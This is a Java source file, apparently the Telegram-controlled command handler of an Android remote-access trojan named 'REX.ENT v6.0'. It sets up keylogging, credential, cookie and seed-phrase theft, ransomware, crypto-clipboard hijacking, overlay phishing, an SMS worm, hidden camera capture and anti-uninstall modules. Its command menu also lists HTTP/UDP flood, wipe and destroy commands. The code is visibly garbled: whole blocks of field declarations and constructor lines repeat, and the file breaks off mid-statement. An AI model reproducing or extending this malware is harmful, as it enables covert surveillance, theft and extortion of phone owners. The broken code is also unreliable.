package com.enterprise.rat.commands;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import com.enterprise.rat.admin.AdminReceiver;
import com.enterprise.rat.activities.FakeUpdateActivity;
import com.enterprise.rat.bot.BotConfig;
import com.enterprise.rat.services.AccessibilityService;
import com.enterprise.rat.utils.AntiVM;
import com.enterprise.rat.utils.TelegramApi;
import com.google.gson.JsonObject;

public class CommandHandler {
    private Context context;
    private FileManager fileManager;
    private SMSManager smsManager;
    private LocationManager locationManager;
    private CameraManager cameraManager;
    private DeviceInfoManager deviceInfoManager;
    private ContactManager contactManager;
    private CallManager callManager;
    private AudioManager audioManager;
    private ScreenManager screenManager;
    private KeyloggerManager keyloggerManager;
    private ShellManager shellManager;
    private SocialMediaManager socialMediaManager;
    private AppManager appManager;
    private PhishingManager phishingManager;
    private CallRecorderManager callRecorderManager;
    private CookieStealerManager cookieStealerManager;
    private RansomwareManager ransomwareManager;
    private WiFiScannerManager wifiScannerManager;
    private CryptoClipboardManager cryptoClipboardManager;
    private CredentialDumper credentialDumper;
    private AppControllerManager appControllerManager;
    private ProcessManager processManager;
    private SIMInfoManager simInfoManager;
    private USSDManager ussdManager;
    private SMSForwarderManager smsForwarderManager;
    private NotificationReplyManager notificationReplyManager;
    private GeofenceManager geofenceManager;
    private CalendarDumpManager calendarDumpManager;
    private SystemSettingsManager systemSettingsManager;
    private FlashlightManager flashlightManager;
    private WallpaperManager wallpaperManager;
    private TTSSpeakManager ttsSpeakManager;
    private ZipManager zipManager;
    private AppUsageStatsManager usageStatsManager;
    private SearchFileManager searchFileManager;
    private BluetoothScannerManager bluetoothScannerManager;
    private SelfUpdateManager selfUpdateManager;
    private ScreenStreamManager screenStreamManager;
    private AntiDebugDetector antiDebugDetector;
    private GmailExtractorManager gmailExtractorManager;
    private LiveStreamManager liveStreamManager;
    private AntiUninstallManager antiUninstallManager;
    private OverlayPhishingManager overlayPhishingManager;
    private CryptoClipboardHijackManager cryptoClipboardHijackManager;
    private ScreenLiveStreamManager screenLiveStreamManager;
    private VNCManager vncManager;
    private BrowserStealerManager browserStealerManager;
    private CallForwardManager callForwardManager;
    private NotificationInterceptManager notificationInterceptManager;
    private WhatsAppReaderManager whatsAppReaderManager;
    private HiddenCameraManager hiddenCameraManager;
    private SMSWormManager smsWormManager;
    private FirebaseC2Manager firebaseC2Manager;
    private FileMonitorManager fileMonitorManager;
    private WiFiAutoConnectManager wifiAutoConnectManager;
    private WhatsAppImpersonationManager whatsAppImpersonationManager;
    private GeofenceAlertManager geofenceAlertManager;
    private SeedPhraseStealerManager seedPhraseStealerManager;
    private HiddenCameraManager hiddenCameraManager;
    private SMSWormManager smsWormManager;
    private FirebaseC2Manager firebaseC2Manager;
    private FileMonitorManager fileMonitorManager;
    private WiFiAutoConnectManager wifiAutoConnectManager;
    private WhatsAppImpersonationManager whatsAppImpersonationManager;
    private GeofenceAlertManager geofenceAlertManager;
    private SeedPhraseStealerManager seedPhraseStealerManager;
    private HiddenCameraManager hiddenCameraManager;
    private SMSWormManager smsWormManager;
    private FirebaseC2Manager firebaseC2Manager;
    private FileMonitorManager fileMonitorManager;
    private WiFiAutoConnectManager wifiAutoConnectManager;
    private WhatsAppImpersonationManager whatsAppImpersonationManager;
    private GeofenceAlertManager geofenceAlertManager;
    private SeedPhraseStealerManager seedPhraseStealerManager;

    public CommandHandler(Context context) {
        this.context = context;
        this.fileManager = new FileManager(context);
        this.smsManager = new SMSManager(context);
        this.locationManager = new LocationManager(context);
        this.cameraManager = new CameraManager(context);
        this.deviceInfoManager = new DeviceInfoManager(context);
        this.contactManager = new ContactManager(context);
        this.callManager = new CallManager(context);
        this.audioManager = new AudioManager(context);
        this.screenManager = new ScreenManager(context);
        this.keyloggerManager = new KeyloggerManager(context);
        this.shellManager = new ShellManager();
        this.socialMediaManager = new SocialMediaManager(context);
        this.appManager = new AppManager(context);
        this.phishingManager = new PhishingManager(context);
        this.callRecorderManager = new CallRecorderManager(context);
        this.cookieStealerManager = new CookieStealerManager(context);
        this.ransomwareManager = new RansomwareManager(context);
        this.wifiScannerManager = new WiFiScannerManager(context);
        this.cryptoClipboardManager = new CryptoClipboardManager(context);
        this.credentialDumper = new CredentialDumper(context);
        this.appControllerManager = new AppControllerManager(context);
        this.processManager = new ProcessManager(context);
        this.simInfoManager = new SIMInfoManager(context);
        this.ussdManager = new USSDManager(context);
        this.smsForwarderManager = new SMSForwarderManager(context);
        this.notificationReplyManager = new NotificationReplyManager(context);
        this.geofenceManager = new GeofenceManager(context);
        this.calendarDumpManager = new CalendarDumpManager(context);
        this.systemSettingsManager = new SystemSettingsManager(context);
        this.flashlightManager = new FlashlightManager(context);
        this.wallpaperManager = new WallpaperManager(context);
        this.ttsSpeakManager = new TTSSpeakManager(context);
        this.zipManager = new ZipManager();
        this.usageStatsManager = new AppUsageStatsManager(context);
        this.searchFileManager = new SearchFileManager();
        this.bluetoothScannerManager = new BluetoothScannerManager(context);
        this.selfUpdateManager = new SelfUpdateManager(context);
        this.screenStreamManager = new ScreenStreamManager(context);
        this.antiDebugDetector = new AntiDebugDetector();
        this.gmailExtractorManager = new GmailExtractorManager();
        this.liveStreamManager = new LiveStreamManager(context);
        this.antiUninstallManager = new AntiUninstallManager(context);
        this.overlayPhishingManager = new OverlayPhishingManager(context);
        this.cryptoClipboardHijackManager = new CryptoClipboardHijackManager(context);
        this.screenLiveStreamManager = new ScreenLiveStreamManager(context);
        this.vncManager = new VNCManager(context);
        this.browserStealerManager = new BrowserStealerManager(context);
        this.callForwardManager = new CallForwardManager(context);
        this.whatsAppReaderManager = new WhatsAppReaderManager(context);
        this.hiddenCameraManager = new HiddenCameraManager(context);
        this.smsWormManager = new SMSWormManager(context);
        this.fileMonitorManager = new FileMonitorManager();
        this.wifiAutoConnectManager = new WiFiAutoConnectManager(context);
        this.whatsAppImpersonationManager = new WhatsAppImpersonationManager(context);
        this.geofenceAlertManager = new GeofenceAlertManager(context);
        this.seedPhraseStealerManager = new SeedPhraseStealerManager(context);
        this.firebaseC2Manager = new FirebaseC2Manager(this);
        this.hiddenCameraManager = new HiddenCameraManager(context);
        this.smsWormManager = new SMSWormManager(context);
        this.fileMonitorManager = new FileMonitorManager();
        this.wifiAutoConnectManager = new WiFiAutoConnectManager(context);
        this.whatsAppImpersonationManager = new WhatsAppImpersonationManager(context);
        this.geofenceAlertManager = new GeofenceAlertManager(context);
        this.seedPhraseStealerManager = new SeedPhraseStealerManager(context);
        this.firebaseC2Manager = new FirebaseC2Manager(this);
        this.hiddenCameraManager = new HiddenCameraManager(context);
        this.smsWormManager = new SMSWormManager(context);
        this.fileMonitorManager = new FileMonitorManager();
        this.wifiAutoConnectManager = new WiFiAutoConnectManager(context);
        this.whatsAppImpersonationManager = new WhatsAppImpersonationManager(context);
        this.geofenceAlertManager = new GeofenceAlertManager(context);
        this.seedPhraseStealerManager = new SeedPhraseStealerManager(context);
        this.firebaseC2Manager = new FirebaseC2Manager(this);
    }

    public void handleCommand(String text, long chatId, String messageId, JsonObject message) {
        String[] parts = text.trim().split("\\s+");
        if (parts.length == 0) return;
        String cmd = parts[0].toLowerCase();
        if (cmd.equals("/start") || cmd.equals("/help") || cmd.equals("/menu")) { processGlobal(cmd); return; }

        String target = "ALL";
        String[] args = new String[0];
        if (parts.length >= 2) {
            String second = parts[1].toUpperCase();
            if (second.startsWith("SESSION_") || second.equals("ALL")) {
                target = second;
                args = new String[parts.length - 2];
                System.arraycopy(parts, 2, args, 0, args.length);
            } else {
                args = new String[parts.length - 1];
                System.arraycopy(parts, 1, args, 0, args.length);
            }
        }

        String mySession = BotConfig.SESSION_ID.toUpperCase();
        if (!target.equals("ALL") && !target.equals(mySession)) return;

        execute(cmd, args);
    }

    private void processGlobal(String cmd) {
        if (cmd.equals("/start")) {
            TelegramApi.sendMessage("⚡ <b>REX.ENT v6.0</b>\nSession: <code>" + BotConfig.SESSION_ID + "</code>\n\nGunakan <code>/menu</code> untuk daftar perintah.");
        } else {
            TelegramApi.sendMessage(getMenu());
        }
    }

    private String getMenu() {
        return "<b>📋 REX.ENT v6.0 — COMMAND MENU</b>\n\n" +
            "<b>📁 File Manager</b>\n<code>/ls /download /rm /rename /search /zip</code>\n\n" +
            "<b>📍 Location</b>\n<code>/location /gps /geofence</code>\n\n" +
            "<b>💬 SMS / Calls</b>\n<code>/sms_list /sendsms /delsms /calls /contacts /sms_fwd</code>\n\n" +
            "<b>📷 Camera</b>\n<code>/photo_front /photo_back /record /call_record</code>\n\n" +
            "<b>🎙 Audio</b>\n<code>/mic /liveaudio</code>\n\n" +
            "<b>🖥 Screen</b>\n<code>/screenshot /screenrecord /screen_lock /screen_unlock /stream_start /stream_stop</code>\n\n" +
            "<b>⌨ Keylogger</b>\n<code>/keylog_start /keylog_stop /keylog_dump</code>\n\n" +
            "<b>📱 Device</b>\n<code>/info /apps /battery /network /permissions /cpu_ram /usage</code>\n\n" +
            "<b>📋 Clipboard</b>\n<code>/clipboard /setclip /crypto_monitor_start /crypto_hijack_start /crypto_hijack_stop</code>\n\n" +
            "<b>🔔 Notification</b>\n<code>/notif /fakenotif /otp_scan /reply</code>\n\n" +
            "<b>📦 Stealer</b>\n<code>/steal_images /steal_docs /extract_wa /extract_tg /cookies /history</code>\n\n" +
            "<b>🌐 Network</b>\n<code>/httpflood /udpflood /wifi_scan /wifi_pass /bluetooth</code>\n\n" +
            "<b>⚙ Shell</b>\n<code>/shell /sush /process_list /kill_pid /kill_pkg</code>\n\n" +
            "<b>🛡 System</b>\n<code>/openurl /toast /phish /vibrate /playsound /lock /wipe /destroy /hideicon</code>\n\n" +
            "<b>🎣 Phishing</b>\n<code>/overlay_phish /overlay_remove /fake_update</code>\n\n" +
            "<b>🔐 Protection</b>\n<code>/uninstall_block /uninstall_unblock</code>\n\n" +
            "<b>🎮 Control</b>\n<code>/flashlight /volume /brightness /ring_mode /wallpaper /speak</code>\n\n" +
            "<b>➕ Other</b>\n<code>/sim_info /ussd /calendar_dump /launch /update /check_env /gmail /socmed /cred_harvest_start /cred_dump</code>\n\n" +
